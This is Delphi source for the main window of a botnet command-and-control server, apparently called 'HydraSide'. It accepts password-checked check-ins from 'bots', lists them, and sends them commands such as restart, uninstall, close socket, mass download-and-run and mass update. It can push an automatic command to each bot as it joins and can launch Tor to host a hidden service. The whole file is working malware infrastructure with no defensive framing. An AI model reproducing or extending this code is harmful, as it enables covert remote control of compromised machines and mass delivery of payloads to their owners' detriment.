unit UMian;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.StdCtrls, Vcl.ComCtrls,
  IdContext, IdBaseComponent, IdComponent, IdCustomTCPServer, IdTCPServer,
  Vcl.ExtCtrls,USettings, Vcl.Buttons,shellapi,ufunctions,uclientsettings;


type
  TDynStringArray = array of string;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    Bots: TTabSheet;
    Botz: TListView;
    Debug: TTabSheet;
    Logs: TMemo;
    Settings: TTabSheet;
    TabSheet1: TTabSheet;
    MainMenu1: TMainMenu;
    TCPServer1: TIdTCPServer;
    S1: TMenuItem;
    S2: TMenuItem;
    ClientPopup: TPopupMenu;
    D1: TMenuItem;
    N1: TMenuItem;
    S4: TMenuItem;
    U1: TMenuItem;
    R1: TMenuItem;
    C1: TMenuItem;
    U2: TMenuItem;
    Connection: TGroupBox;
    Label1: TLabel;
    ConPasswrd: TEdit;
    Label2: TLabel;
    EdtPort: TEdit;
    GroupBox1: TGroupBox;
    EdtTorPath: TEdit;
    Label3: TLabel;
    edtTorFiles: TEdit;
    Label4: TLabel;
    edtTorPort: TEdit;
    Label5: TLabel;
    EdtTorec: TEdit;
    Label6: TLabel;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    S5: TMenuItem;
    o1: TMenuItem;
    M1: TMenuItem;
    S6: TMenuItem;
    S7: TMenuItem;
    M2: TMenuItem;
    A1: TMenuItem;
    E1: TMenuItem;
    N2: TMenuItem;
    GroupBox2: TGroupBox;
    CBShowNotif: TCheckBox;
    CBShowPopup: TCheckBox;
    GroupBox3: TGroupBox;
    LogConns: TCheckBox;
    CBLogIncom: TCheckBox;
    CBLogDis: TCheckBox;
    GroupBox4: TGroupBox;
    CBEnableDebug: TCheckBox;
    Ti1: TTrayIcon;
    IconPopup: TPopupMenu;
    E2: TMenuItem;
    N3: TMenuItem;
    S8: TMenuItem;
    S9: TMenuItem;
    S10: TMenuItem;
    S11: TMenuItem;
    A2: TMenuItem;
    A3: TMenuItem;
    A4: TMenuItem;
    A5: TMenuItem;
    N4: TMenuItem;
    M3: TMenuItem;
    D3: TMenuItem;
    U3: TMenuItem;
    U4: TMenuItem;
    N5: TMenuItem;
    A6: TMenuItem;
    A7: TMenuItem;
    A9: TMenuItem;
    EventLog: TListView;
    Label7: TLabel;
    ConnsLab: TLabel;
    PMConlogs: TPopupMenu;
    C3: TMenuItem;
    PMDebugger: TPopupMenu;
    C4: TMenuItem;
    CBLogConns: TCheckBox;
    CBNotifyOnCon: TCheckBox;
    CBNotifyDisCon: TCheckBox;
    GroupBox5: TGroupBox;
    CBLoadSettings: TCheckBox;
    Button4: TButton;
    Button5: TButton;
    CbOpenTor: TCheckBox;
    Label8: TLabel;
    SockState: TLabel;
    CBStartSockOnOpen: TCheckBox;
    Label9: TLabel;
    TorState: TLabel;
    procedure S2Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure TCPServer1Disconnect(AContext: TIdContext);
    procedure TCPServer1Exception(AContext: TIdContext; AException: Exception);
    Procedure Debugger(str:string);
    procedure TCPServer1Execute(AContext: TIdContext);
    Procedure TCPServerSendStr(MessageStr:string;Socket:integer);
    function Explode(const Separator, S :String; Limit :Integer = 0): TDynStringArray;
    procedure D1Click(Sender: TObject);
    procedure AddToConLogs(Event,Socket,localport:string);
    procedure TCPServer1Connect(AContext: TIdContext);
    procedure C3Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure LogConnsClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure A1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure CBShowNotifClick(Sender: TObject);
    procedure CBShowPopupClick(Sender: TObject);
    procedure NotifyClientUser(State,Socket,port:string);
    procedure C1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure U2Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure D3Click(Sender: TObject);
    procedure U3Click(Sender: TObject);
    procedure U4Click(Sender: TObject);
    procedure A9Click(Sender: TObject);
    procedure A7Click(Sender: TObject);
    procedure TcpServerSendToAll(Str:string);
    procedure Button5Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure S6Click(Sender: TObject);
    procedure S7Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure M2Click(Sender: TObject);



  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  tid :cardinal;


implementation

{$R *.dfm}

uses UAbout, UDownloader, UAutoDownloader, UAutoUpdate, UMassDownloaderpas,
  Updater, UTorManage;



procedure Tform1.TcpServerSendToAll(Str: string);
var
  list: TList;
  Context: TIdContext;
  i:integer;
begin
I:= 0;
try
  List := TCPServer1.Contexts.LockList;
    for i := 0 to List.Count - 1 do
        begin
          Context := TIdContext(List[i]);
            try
              Context.Connection.IOHandler.WriteLn(Str);
            except
            end;
            //Break;
        end;
      finally
    TCPserver1.Contexts.UnlockList;
  end;
end;

procedure TForm1.NotifyClientUser(State,Socket,port:string);
begin
 if CBshownotif.Checked then
 begin
   if CBnotifyoncon.Checked then
    begin
     form1.Ti1.BalloonTimeout := 1;
    if State = 'Connect' then form1.Ti1.BalloonTitle := 'HydraSide Client Connected ';
    if state = 'Connect' then form1.Ti1.BalloonHint := 'User Connected Port : '+ Port + 'Socket ID : ' + Socket;
     Form1.Ti1.ShowBalloonHint;
     sleep(100);
      //  notify on connect      /.time
    end;
   if CBNotifyDisCon.Checked then
    begin
      //  notify on disconnect
      form1.Ti1.BalloonTimeout := 1;
      if State = 'disconnect' then form1.Ti1.BalloonTitle := 'HydraSide Client Disconnected ';
      if state = 'Disconnect' then form1.Ti1.BalloonHint := 'User Connected Port : '+ Port + 'Socket ID : ' + Socket;
      Form1.Ti1.ShowBalloonHint;
      sleep(100);
    end;
 end
 else
 if CBshowpopup.Checked then
 begin
   if CBnotifyoncon.Checked then
    begin
      //  notify on connect
    end;
   if CBNotifyDisCon.Checked then
    begin
      //  notify on disconnect
    end;
 end;
end;

procedure TForm1.R1Click(Sender: TObject);
begin
TCPServerSendStr('Restart',strtoint(botz.Selected.Caption));
end;

procedure TForm1.A1Click(Sender: TObject);
begin
form2.Show;
end;


procedure TForm1.A7Click(Sender: TObject);
begin
if form1.A9.Checked then
  begin
    showmessage('You can only set one auto command at this point.');
    exit;
  end;
if form1.a7.Checked = true then
  begin
    showmessage('Command Reset');
    AutoCommand := '';
    AutoCommandSet := false;
    form1.a7.Checked := false;
    sleep(100);
  end
  else
  begin
   form4.show;
  end;
//auto mass download and run.
end;

procedure TForm1.A9Click(Sender: TObject);
begin
if a7.Checked then
  begin
    showmessage('You can only set one auto command at this point.');
    exit;
  end;
if form1.a9.Checked = true then
  begin
    showmessage('Command Reset');
    AutoCommand := '';
    AutoCommandSet := false;
    form1.a7.Checked := false;
    sleep(100);
  end
  else
  begin
   form5.show;
  end;
// auto mass update
end;

procedure Tform1.AddToConLogs(Event,Socket,localport:string);
begin
if form1.LogConns.Checked then
    begin
     with form1.eventlog.Items.Add do
                begin
                  Caption := event;
                  SubItems.Append(socket);
                  SubItems.Append(localport);
                  SubItems.Append(TimeToStr(Time));
                end;
                form1.EventLog.Update;
    end
    else
      begin
        exit;
      end;
end;


procedure TForm1.Button1Click(Sender: TObject);
begin
 if FileExists(GetCurrentDir + EdtTorPath.Text) then
  begin
    runapp(GetCurrentDir + EdtTorPath.Text);
    ShowMessage('Tor Started');
  end
  else
  begin
    Showmessage('The Tor binary was not in the tor folder.');
  end;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
KillTask('Tor.exe');
Showmessage('Tor stopped!')
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
form8.show;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
saveclientsettings;
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
readclientsettings;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
tcpserver1.Active := false;
TcpServer1.Free;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
   TorrecFile : TextFile;
begin
if directoryexists(GetCurrentDir + '\Tor') = false then
  begin
    CreateDir(Getcurrentdir + '\Tor');
    CreateDir(GetCurrentDir + '\Tor\TorBin');
    CreateDir(GetCurrentDir + '\Tor\TorHostFiles');
    CreateDir(GetCurrentDir + '\Tor\TorHostFiles\HostFiles');
    CreateDir(GetCurrentDir + '\Tor\Torrec');
    if not Fileexists(GetCurrentDir + '\Tor\Torrec\' + 'Torrec') then
      begin
        AssignFile(TorrecFile, GetCurrentDir + '\Tor\Torrec\' + 'Torrec');
        ReWrite(TorrecFile);
        writeln(TorrecFile,'');
        CloseFile(TorrecFile);
      end;
  end
  else
  begin
   //
  end;
if fileexists(getcurrentdir + '\' + 'UserSettings.ini') then readclientsettings;
s2.Enabled := false;
AutoCommand := '';
AutoCommandset := false;
end;



procedure TForm1.LogConnsClick(Sender: TObject);
begin
if form1.CBLogIncom.Enabled = false then
  begin
    form1.CBLogIncom.Enabled := true;
    Form1.CBLogDis.Enabled := true;

    form1.CBLogConns.Enabled := true;
  end
  else
  begin
    form1.CBLogIncom.Enabled := false;
    Form1.CBLogDis.Enabled := false;

    form1.CBLogConns.Enabled := false;
  end;
end;



procedure TForm1.M2Click(Sender: TObject);
begin
Tform8.show;
end;

procedure TForm1.S1Click(Sender: TObject);
begin
if not IsPortActive('localhost',strtoint(EdtTorPort.Text)) then
    begin
     Torstate.Caption := 'Not Running';
     showmessage('Warning Tor is Not running. if Tor is Running please change settings.');
    end
    else
    begin
      Torstate.Caption := 'Running';
    end;
sockstate.Caption := 'Active';
if EdtPort.Text = '' then
begin
  showmessage('Warning defult port has been used as Port Was Not Set! port number is  : '+ inttostr(dport));
  Edtport.Text := inttostr(DPort);
end;
if tcpserver1.Active = true then exit;
s2.Enabled := true;
s1.Enabled := false;
TcpServer1.DefaultPort := strtoint(Edtport.Text);
TcpServer1.Active := true;
debugger('Socket Started on Port : ' + EdtPort.Text);
CreateThread(nil, 0,@CheckForTorPort, nil, 0, tid);
end;

procedure TForm1.S2Click(Sender: TObject);
begin
//TCPServerSendtoall('Restart');
logs.Lines.Add('Closing Socket Restart Sent.');
sleep(10);
sockstate.Caption := 'Disactive';
s1.Enabled := true;
s2.Enabled := false;
logs.Lines.Add('Closing Socket.');
TcpServer1.StopListening;
debugger('Socket Stopped Port Cloesed : ' + EdtPort.Text);
Connslab.Caption := '0';
botz.Clear;
end;

procedure TForm1.S6Click(Sender: TObject);
begin
 if FileExists(GetCurrentDir + EdtTorPath.Text) then
  begin
    runapp(GetCurrentDir + EdtTorPath.Text);
    ShowMessage('Tor Started');
  end
  else
  begin
    Showmessage('The Tor binary was not in the tor folder.');
  end;
end;

procedure TForm1.S7Click(Sender: TObject);
begin
KillTask('Tor.exe');
Showmessage('Tor stopped!')
//stop
end;

Procedure Tform1.TCPServerSendStr(MessageStr:string;Socket:integer);
var
  list: TList;
  Context: TIdContext;
  i:integer;
begin
try
  List := TCPServer1.Contexts.LockList;
    for i := 0 to List.Count - 1 do
        begin
          Context := TIdContext(List[i]);
          if Context.Connection.Socket.Binding.PeerPort = socket then
          begin
            try
              Context.Connection.IOHandler.WriteLn(MessageStr);
            except
            end;
            Break;
          end;
        end;
      finally
    TCPserver1.Contexts.UnlockList;
  end;
end;





procedure TForm1.U1Click(Sender: TObject);
begin
TCPServerSendStr('Uninstall',strtoint(botz.Selected.Caption));
end;

procedure TForm1.U2Click(Sender: TObject);
begin
form7.show;
end;

procedure TForm1.U3Click(Sender: TObject);
begin
form5.Show;
//mas update servers
end;

procedure TForm1.U4Click(Sender: TObject);
begin
TcpServerSendToAll('Uninstall');
end;

procedure TForm1.TCPServer1Connect(AContext: TIdContext);
var
s,p:integer;
begin
s:= Acontext.Connection.Socket.Binding.PeerPort;
P:= Acontext.Connection.Socket.Binding.Port;
if form1.CBLogIncom.Checked then
  begin
    AddToConLogs('Attempted Connection : ',inttostr(s),inttostr(p));
  end;
end;

procedure TForm1.TCPServer1Disconnect(AContext: TIdContext);
var
I,s,p,c:integer;
str,port:string;
begin
i:=0;
if botz.items.count = 0 then exit;
if botz.Items.Count <> 0 then
     begin
        s:= Acontext.Connection.Socket.Binding.PeerPort;
        P:= Acontext.Connection.Socket.Binding.Port;
        str:= Botz.Items.item[i].Caption;
        port:= inttostr(s);
        c:= botz.items.count;
        if CBLogDis.Checked then
          begin
             AddToConLogs('Disconnected',inttostr(s),inttostr(p));
          end;
        NotifyClientUser('Disconnect',inttostr(s),inttostr(p));
        for I := 0 to Botz.Items.Count -1 do
            begin
                try
                  if botz.Items.Count > i then
                  begin
                     str:= Botz.Items.item[i].Caption;
                     if str = port then botz.Items.Delete(i);
                  end;
                  finally
                  connslab.Caption := inttostr(botz.Items.Count);
                  botz.Update;
                 end;
            end;
     end;
end;

procedure TForm1.TCPServer1Exception(AContext: TIdContext;
  AException: Exception);
begin
logs.Lines.Add('IdTCPServer1Exception : ' + AException.Message + ' ('+ TimeToStr(Time)+ ' )');
logs.update;
end;


procedure TForm1.TCPServer1Execute(AContext: TIdContext);
var
Str:string;
  strArr: TDynStringArray;
  s,p :integer;
begin

if AContext.Connection.Connected and
    AContext.Connection.IOHandler.Readable then
  begin
    Str := AContext.Connection.IOHandler.ReadLn;
    s:= Acontext.Connection.Socket.Binding.PeerPort;
    P:= Acontext.Connection.Socket.Binding.Port;
    if str <> '' then
      begin
         StrArr := Explode('|', STR);

         if StrArr[0] = 'ADDNEW' then
          begin
            if StrArr[1] = conpasswrd.Text then    //check password.
            begin
             if CBlogconns.Checked then AddToConLogs('Connected',inttostr(s),inttostr(p));
             NotifyClientUser('Connect',inttostr(s),inttostr(p));
              with botz.Items.Add do
                begin
                  Caption := inttostr(Acontext.Connection.Socket.Binding.peerport);
                  SubItems.Append(StrArr[2]);
                  SubItems.Append(StrArr[3]);
                  SubItems.Append(StrArr[4]);
                  SubItems.Append(StrArr[5]);
                  SubItems.Append(StrArr[6]);
                  SubItems.Append(StrArr[7]);
                  SubItems.Append(StrArr[8]);
                  SubItems.Append(StrArr[9]);
                  connslab.Caption := inttostr(botz.Items.Count);
                end;
               if AutoCommandSet = true then
               begin
                 if AutoCommand <> '' then
                  begin
                  TCPServerSendStr(AutoCommand,Acontext.Connection.Socket.Binding.peerport);
                  logs.Lines.Add('AutoCommand Send : ' +  AutoCommand + ' Time : ' + timetostr(time))
                  end
                  else
                  begin
                    Logs.Lines.Add('AutoCommand Failure : ' + AutoCommand + ' Time : ' +timetostr(time));
                    AutoCommand := '';
                    AutoCommandSet := false;
                    Logs.Lines.Add('AutoComand System Reset Please Reset Command.');
                  end;
               end;
            end
            else
            if StrArr[0] = '' then
              begin

              end
            else
            begin
              AContext.Connection.Disconnect;
            end;
          end;
          //
      end;
  end;
end;

procedure TForm1.C1Click(Sender: TObject);
begin
TCPServerSendStr('CloseSock',strtoint(botz.Selected.Caption));
end;

procedure TForm1.C3Click(Sender: TObject);
begin
form1.EventLog.Clear;
form1.EventLog.Update;
end;

procedure TForm1.C4Click(Sender: TObject);
begin
form1.Logs.Lines.Clear;
form1.Logs.Update;
end;

procedure TForm1.CBShowNotifClick(Sender: TObject);
begin
if form1.CBShowNotif.Checked then
  begin
    CBnotifyoncon.Enabled := true;
    CBNotifyDisCon.Enabled := true;
  end
  else
  begin
    CBnotifyoncon.Enabled := false;
    CBNotifyDisCon.Enabled := false;
  end;
if form1.CBShowpopup.checked then
  begin
    CBnotifyoncon.Enabled := true;
    CBNotifyDisCon.Enabled := true;
  end
end;

procedure TForm1.CBShowPopupClick(Sender: TObject);
begin
if form1.CBShowpopup.checked then
  begin
    CBnotifyoncon.Enabled := true;
    CBNotifyDisCon.Enabled := true;
  end
  else
  begin
    CBnotifyoncon.Enabled := false;
    CBNotifyDisCon.Enabled := false;
  end;
if form1.CBShowNotif.Checked then
  begin
    CBnotifyoncon.Enabled := true;
    CBNotifyDisCon.Enabled := true;
  end
end;

procedure TForm1.D1Click(Sender: TObject);
begin
form3.show;
end;



procedure TForm1.D3Click(Sender: TObject);
begin
form6.Show;
end;

procedure Tform1.Debugger(str: string);
begin
  if CBEnableDebug.Checked then
    begin
      logs.Lines.Add(str);
      logs.Update;
    end
    else
    begin
      exit;
    end;
end;


function Tform1.Explode(const Separator, S :String; Limit :Integer = 0): TDynStringArray;
  var
    SepLen: Integer;
    F, P: PChar;
begin
  SetLength(Result, 0);
  if (S = '') or (Limit < 0) then
    Exit;
  if Separator = '' then
    begin
      SetLength(Result, 1);
      Result[0] := S;
      Exit;
    end;
  SepLen := Length(Separator);

  P := PChar(S);
  while P^ <> #0 do
    begin
      F := P;
      P := AnsiStrPos(P, PChar(Separator));
      if (P = nil) or ((Limit > 0) and (Length(Result) = Limit - 1)) then
        P := StrEnd(F);
      SetLength(Result, Length(Result) + 1);
      SetString(Result[High(Result)], F, P - F);
      F := P;
      if P = Separator then
        SetLength(Result, Length(Result) + 1);
      while (P^ <> #0) and (P - F < SepLen) do
        Inc(P);
    end;
end;
end.
